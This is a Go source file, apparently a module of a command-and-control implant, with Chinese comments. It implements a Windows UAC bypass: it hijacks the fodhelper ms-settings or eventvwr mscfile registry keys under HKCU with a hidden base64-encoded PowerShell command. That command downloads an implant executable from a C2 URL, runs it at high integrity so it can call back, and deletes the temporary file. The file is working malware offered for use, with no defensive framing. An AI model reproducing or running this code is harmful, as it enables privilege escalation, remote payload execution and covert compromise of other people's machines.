//go:build windows && !light

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"syscall"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// ─── UAC 提权（注册表法 + 独立进程上线，多系统自适应）────────────────
//
// uac_bypass 任务：通过 HKCU 注册表（无需管理员）把某个自动提升程序的
// 启动目标指向一条 powershell 命令，触发后系统以**高完整性**启动
// powershell；powershell 从 C2 下载植入端 exe 并以**独立进程**运行
// （%TEMP% 临时文件，数秒后自删），新植入端以高完整性回连 C2 上线
// 新会话，实现"远程提权并上线"。
//
// 采用独立进程而非内存执行的原因：donut 在当前进程内执行 Go 植入端时，
// Go runtime 会接管宿主进程（与 powershell/.NET 冲突、main 结束杀进程）
// 导致新植入端掉线，故改为临时文件 + 独立进程（文件存在仅数秒）。
//
// 自动提升目标按系统选择（文件存在性探测，兼容老系统）：
//   - fodhelper.exe（Win10+）：ms-settings 注册表 + DelegateExecute
//   - eventvwr.msc（Win7 / 2008 / Vista）：mscfile 注册表
//
// 任务数据格式：{"payload_url":"http(s)://host:port/api/v1/implant/uac/<token>"}

// uacTarget 描述一个可用的 UAC 绕过目标。
type uacTarget struct {
	trigger   string // 触发命令（fodhelper.exe / eventvwr.msc）
	keyPath   string // 劫持的注册表键
	delegate  bool   // 是否写 DelegateExecute（ms-settings 需要）
	cleanKeys []string
}

// detectUACTarget 探测系统可用的自动提升目标。
func detectUACTarget() *uacTarget {
	// 1) fodhelper（Win10+）
	if fileExistsSys32("fodhelper.exe") {
		return &uacTarget{
			trigger: "fodhelper.exe",
			keyPath: `Software\Classes\ms-settings\Shell\Open\command`,
			delegate: true,
			cleanKeys: []string{
				`Software\Classes\ms-settings\Shell\Open\command`,
				`Software\Classes\ms-settings\Shell\Open`,
				`Software\Classes\ms-settings\Shell`,
				`Software\Classes\ms-settings`,
			},
		}
	}
	// 2) eventvwr（Win7 / 2008 / Vista：mscfile 劫持）
	if fileExistsSys32("eventvwr.exe") {
		return &uacTarget{
			trigger:  "eventvwr.msc",
			keyPath:  `Software\Classes\mscfile\shell\open\command`,
			cleanKeys: []string{
				`Software\Classes\mscfile\shell\open\command`,
				`Software\Classes\mscfile\shell\open`,
				`Software\Classes\mscfile\shell`,
				`Software\Classes\mscfile`,
			},
		}
	}
	return nil
}

// fileExistsSys32 检查 System32 下文件是否存在（GetFileAttributesW）。
func fileExistsSys32(name string) bool {
	proc := resolveAPI("kernel32.dll", "GetFileAttributesW")
	if proc == nil {
		return false
	}
	p, err := windows.UTF16PtrFromString(fmt.Sprintf(`%s\System32\%s`, os.Getenv("SystemRoot"), name))
	if err != nil {
		return false
	}
	r1, _, _ := proc.Call(uintptr(unsafe.Pointer(p)))
	return r1 != 0xFFFFFFFF // INVALID_FILE_ATTRIBUTES
}

// handleUACBypass 执行 UAC 提权（按系统自动选择 fodhelper / eventvwr）。
func handleUACBypass(taskData string) (string, int32, string) {
	var req struct {
		PayloadURL string `json:"payload_url"`
	}
	if err := json.Unmarshal([]byte(taskData), &req); err != nil {
		return "", -1, fmt.Sprintf("parse uac data failed: %v", err)
	}
	if req.PayloadURL == "" {
		return "", -1, "missing payload_url"
	}

	target := detectUACTarget()
	if target == nil {
		return "", -1, "该系统没有可用的 UAC 绕过目标（fodhelper/eventvwr 均不存在）"
	}

	// 1) 构造 powershell 内存执行脚本（拉取 shellcode → VirtualAlloc → 执行）
	ps := buildUACPsScript(req.PayloadURL)
	// powershell -EncodedCommand 要求 UTF-16LE base64
	u16 := utf16.Encode([]rune(ps))
	raw := make([]byte, len(u16)*2)
	for i, c := range u16 {
		raw[i*2] = byte(c)
		raw[i*2+1] = byte(c >> 8)
	}
	encCmd := base64.StdEncoding.EncodeToString(raw)
	cmdLine := "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " + encCmd

	// 2) 写入劫持注册表
	key, _, err := registry.CreateKey(registry.CURRENT_USER, target.keyPath, registry.SET_VALUE)
	if err != nil {
		return "", -1, fmt.Sprintf("create registry key %s failed: %v", target.keyPath, err)
	}
	if err := key.SetStringValue("", cmdLine); err != nil {
		key.Close()
		return "", -1, fmt.Sprintf("set command failed: %v", err)
	}
	if target.delegate {
		// DelegateExecute 置空：绕过 ms-settings 处理程序，直接执行 command
		if err := key.SetStringValue("DelegateExecute", ""); err != nil {
			key.Close()
			return "", -1, fmt.Sprintf("set DelegateExecute failed: %v", err)
		}
	}
	key.Close()

	// 3) 触发自动提升程序（以高完整性重新拉起 powershell）
	startErr := startProcessNoWait(target.trigger)
	// 无论启动是否成功，都先恢复注册表（避免残留被利用）
	for i := len(target.cleanKeys) - 1; i >= 0; i-- {
		_ = registry.DeleteKey(registry.CURRENT_USER, target.cleanKeys[i])
	}
	if startErr != nil {
		return "", -1, fmt.Sprintf("trigger %s failed: %v", target.trigger, startErr)
	}

	return fmt.Sprintf("UAC bypass triggered (%s)：高完整性 powershell 已启动，正在拉取载荷内存执行并回连（新会话将以上线）", target.trigger), 0, ""
}

// buildUACPsScript 生成 powershell 提权脚本：下载植入端 exe → 以独立进程
// 启动（高完整性）→ 数秒后自删临时文件。
//
// 说明：donut shellcode 在当前进程内执行 Go 植入端会导致 Go runtime 接管
// 宿主进程（与 powershell/.NET 冲突、main 结束杀进程）而掉线，因此这里
// 改为"临时文件 + 独立进程"方式：文件仅存在数秒即删除，运行中的进程
// 不受删除影响，新植入端以独立高完整性进程稳定回连。
func buildUACPsScript(payloadURL string) string {
	return `$u='` + payloadURL + `';
$f=$env:TEMP+'\'+[guid]::NewGuid().ToString('N')+'.exe';
(New-Object Net.WebClient).DownloadFile($u,$f);
[System.Diagnostics.Process]::Start($f);
Start-Sleep -Seconds 6;
Remove-Item $f -Force -ErrorAction SilentlyContinue;`
}

// startProcessNoWait 通过 CreateProcessW 启动进程（不等待、无窗口）。
// lpCommandLine 使用可写缓冲区（CreateProcessW 可能修改该缓冲区），
// 失败时返回具体系统错误码便于排查。
func startProcessNoWait(image string) error {
	procCreateProcessW := resolveAPI("kernel32.dll", "CreateProcessW")
	procCloseHandle := resolveAPI("kernel32.dll", "CloseHandle")

	// 可写命令行缓冲区（CreateProcessW 官方文档注明可能修改该缓冲区）
	cmdUTF16, err := syscall.UTF16FromString(image)
	if err != nil {
		return err
	}

	type startupInfo struct {
		Cb                 uint32
		Reserved           *uint16
		Desktop            *uint16
		Title              *uint16
		X, Y, XSize, YSize uint32
		XCountChars, YCountChars, FillAttribute, Flags uint32
		ShowWindow, Reserved2 uint16
		Reserved3          *byte
		StdInput, StdOutput, StdErr uintptr
	}
	type processInfo struct {
		Process, Thread uintptr
		ProcessID, ThreadID uint32
	}
	si := startupInfo{Cb: uint32(unsafe.Sizeof(startupInfo{}))}
	// CREATE_NO_WINDOW = 0x08000000
	pi := processInfo{}
	r1, _, _ := procCreateProcessW.Call(
		0, uintptr(unsafe.Pointer(&cmdUTF16[0])), 0, 0, 0,
		0x08000000, 0, 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
	if r1 == 0 {
		return fmt.Errorf("CreateProcessW failed (err=%d)", getLastError())
	}
	procCloseHandle.Call(pi.Process)
	procCloseHandle.Call(pi.Thread)
	return nil
}
